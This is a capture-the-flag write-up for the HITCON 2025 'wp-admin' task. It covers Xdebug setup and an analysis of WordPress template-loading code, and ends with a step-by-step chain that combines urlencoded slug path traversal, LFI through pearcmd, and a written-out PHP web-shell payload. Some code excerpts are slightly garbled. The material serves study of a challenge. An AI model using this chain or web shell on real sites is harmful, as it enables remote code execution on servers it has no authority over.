---
author: Michail Solovev
pubDatetime: 2025-08-08T15:22:00Z
title: Hitcon 2025 wp-admin
slug: hitcon-theme-wp-admin
featured: false
draft: false
tags:
  - writeup
description:
  Wp-admin task. Wordpress RCE without permissions to write data on file system.
---

# wp-admin no data loading

I didn't find anything as the author's writeup showed, and I wasn't looking in the right place. Nevertheless, thanks to this task it was possible to

https://github.com/maple3142/My-CTF-Challenges/tree/master/HITCON%20CTF%202025/wp-admin

- get acquainted with the WP core code
- understand what happens in WP during side authorization and how it is organized
- Learn to debug large PHP projects
- check WP at a high level for standard vulnerabilities found in PHP (as expected, I didn’t find anything right away)
- read other people’s reports on vulnerabilities in WP to understand what the problems might be

#### Setting up Wprdpress debugging

For local debugging of WP located in the docker, only 2 absolutely necessary conditions must be met:

- all php files of the installed WP are in the mounted directory
- throw xdebug.ini into the container

Dockerfile

```
FROM WordPress: 6.8.2

ARG WORDPRESS_DB_HOST
ARG WORDPRESS_DB_USER
ARG WORDPRESS_DB_PASSWORD
ARG WORDPRESS_DB_NAME
ENV WORDPRESS_DB_HOST=$WORDPRESS_DB_HOST
ENV WORDPRESS_DB_USER=$WORDPRESS_DB_USER
ENV WORDPRESS_DB_PASSWORD=$WORDPRESS_DB_PASSWORD
ENV WORDPRESS_DB_NAME=$WORDPRESS_DB_NAME
RUN pecl install xdebug\
&& docker-php-ext-enable xdebug

COPY xdebug.ini /usr/local/etc/php/conf.d/xdebug.ini

COPY install.php /usr/src/wordpress/wp-admin/
COPY setup-wordpress /usr/local/bin/
RUN setup-wordpress apache2-foreground

ENTRY POINT ["apache2-foreground"]
```

xdebug.ini

```
zend_extension=xdebug

xdebug.mode=debug
xdebug.start_with_request=yes

; VS Code
xdebug.client_host=172.17.0.1
xdebug.client_port=9003

xdebug.log=/tmp/xdebug.log
```

vscode launch.json

Here is the volume with the system files, so vscode knows where to go for the debug files

```
{
"version": "0.2.0",
"configurations": [
{
"name": "Listen Xdebug",
"type": "php",
"request": "launch",
"port": 9003,
"pathMappings": {
"/var/www/html": "${workspaceFolder}/wordpress"
}
}
]
}
```

#### Author's exploit

I don't understand how I missed this, I i thought i overlooked all the references to `require` and `require_once` functions in the code.


```php file =/wp-includes/template.php
function load_template($_template_file, $load_once = true, $args = array()) {
global $posts, $post, $wp_did_header, $wp_query, $wp_rewrite, $wpdb, $wp_version, $wp, $id, $comment, $user_ID;
// query parameters are converted to variables
if ( is_array($wp_query->query_vars)) {
extract ($ wp_query->query_vars, EXTR_SKIP);
}
// the s parameter is sanitized to prevent xss
if ( isset($s) ) {
$s = esc_attr($s);
}

do_action('wp_before_load_template', $_template_file, $load_once, $args);

if ($load_once) {
require_once $_template_file;
} else {
require $_template_file;
}
do_action('wp_after_load_template', $_template_file, $load_once, $args);
}
```

As you can see, the function actually includes the file passed to it. Then I double-checked now - `load_template` with the one we control only happens once, and to the same file.


```php file=/wp-includes/template.php
function locate_template( $template_names, $load = false, $load_once = true, $args = array() ) {
global $wp_stylesheet_path, $wp_template_path;
...
foreach ( (array) $template_names as $template_name ) {
if ( ! $template_name ) {
continue;
}
if (file_exists( $wp_stylesheet_path . '/' . $template_name ) ) {
$located = $wp_stylesheet_path . '/' . $template_name;
break;
} elseif ( $is_child_theme && file_exists( $wp_template_path . '/' . $template_name ) ) {
$located = $wp_template_path . '/' . $template_name;
break;
} elseif ( file_exists( ABSPATH . WPINC . '/theme-compat/' . $template_name ) ) {
$located = ABSPATH . WPINC. '/theme-compat/' . $template_name;
break;
}
}

if ( $load && '' !== $located ) {
load_template( $located, $load_once, $args );
}

return $located;
}
```

Here we see how part of the final path that will be passed to `require` is simply concatenated from communication channels.

let's look at the calls to the `locate_template` function

In total, `locate_template` appears in the PHP code base with protection by variable parameters in 5 places, now let's look at the function


```php file =/wp-includes/template.php
function <( $type, $templates = array() ) {
$type = preg_replace( '|[^a-z0-9-]+|', '', $type );
if (empty ($templates)) {
$templates = array( "{$type}.php");
}
...
$templates = apply_filters( "{$type}_template_hierarchy", $templates );
$template =locate_template($templates);
$template =locate_block_template($template, $type, $templates);
...
return apply_filters( "{$type}_template", $template, $type, $templates );
}
```

We don't really care about sanitization in `$type`, let's see how `$templates` can be passed to this function.

Here are even more options for calling this function.


```php file =/wp-includes/template.php
function get_single_template() {
$object = get_queried_object();

$templates = array();
if ( ! empty( $object->post_type ) ) { 
$template = get_page_template_slug( $object ); 
if ( $template && 0 === validate_file( $template ) ) { 
$templates[] = $template; 
} 

$name_decoded = urldecode( $object->post_name ); 
if ( $name_decoded !== $object->post_name ) { 
$templates[] = "single-{$object->post_type}-{$name_decoded}.php"; 
} 

$templates[] = "single-{$object->post_type}-{$object->post_name}.php"; 
$templates[] = "single-{$object->post_type}.php";
}

$templates[] = 'single.php';

return get_query_template( 'single', $templates );
}
```

It's pretty clear when this function is called - when opening a single post, but it's not entirely clear what the object `$object = get_queried_object();` is, so to begin with I just output it.

```php
[29-Aug-2025 07:13:10 UTC] get_single_template called with object: WP_Post Object
( 
[ID] => 1 
[post_author] => 1 
[post_date] => xxxx-xx-xx 16:30:38 
[post_date_gmt] => xxxx-xx-xx 16:30:38 
[post_content] => <!-- wp:paragraph -->
<p>Welcome to WordPress. This is your first post. Edit or delete it, then start writing!</p>
<!-- /wp:paragraph --> 
[post_title] => Hello world! 
[post_excerpt] => 
[post_status] => publish 
[comment_status] => open 
[ping_status] => open 
[post_password] =>
[post_name] => hello-world
[to_ping] =>
[pinged] =>
[post_modified] => xxxx-xx-xx 16:30:38
[post_modified_gmt] => xxxx-xx-xx 16:30:38
[post_content_filtered] =>
[post_parent] => 0
[guid] => http://x.x.x.x/?p=1
[menu_order] => 0
[post_type] => post
[post_mime_type] =>
[comment_count] => 1
[filter] => raw
)
```

The `post_name` name hides the `Slug` field.

In the code we see that WordPress implies that this field can be urlencoded.

Thus, by coding in LFI payload we achieve directory traversal.

```
[THEME_PATH]/single-post-[SLUG].php
```

Where `[THEME_PATH]` is the value of the `stylesheet`option, and `[SLUG]` is the entry slug. If we set `stylesheet` to `../../../../tmp`, and the slug to `/../../something`, the path will be as follows:

```
../../../../tmp/single-post-/../../something.php
```

This means that if the `/tmp/single-post-`folder exists, we can include any file ending with , `.php` in the filesystem, reaching LFI.

The task author suggests using PEAR LFI-RCE. I looked at the [Dockerfile](https://github.com/docker-library/wordpress/blob/cb4dee629a6dbc942cb218f3d8516e71eb13b27e/latest/php8.2/apache/Dockerfile) wordpress and did not see an explicit installation of pear.php. But yes, it is there in the path `/usr/local/lib/php/pearcmd.php`

And as far as I understand, all this is already installed in the usual `php:8.2-apache` container.

#### Author's Split

To use this, do the following:

1.  Make sure that at least two messages exist.
2.  Change the slug of the first one to `%2f%2e%2e%2f%2e%2e%2fusr%2flocal%2flib%2fphp%2fpearcmd` and the second one to `%2f%2e%2e%2f%2e%2e%2ftmp%2fshell` and write down their post IDs.
3.  Change the `stylesheet` parameter to `../../../../tmp`.
4.  Change the `upload_path` parameter to `/tmp/single-post-`.
5.  Upload the attachment somewhere to create the `/tmp/single-post-` folder.
6.  Access `/?p=[PEARCMD_POST_ID]&+config-create+/<?system($_GET[0]);die();?>+/tmp/shell.php` to write the web shell to `/tmp/shell.php`.
7.  Access `/?p=[SHELL_POST_ID]&0=/readflag` to get the flag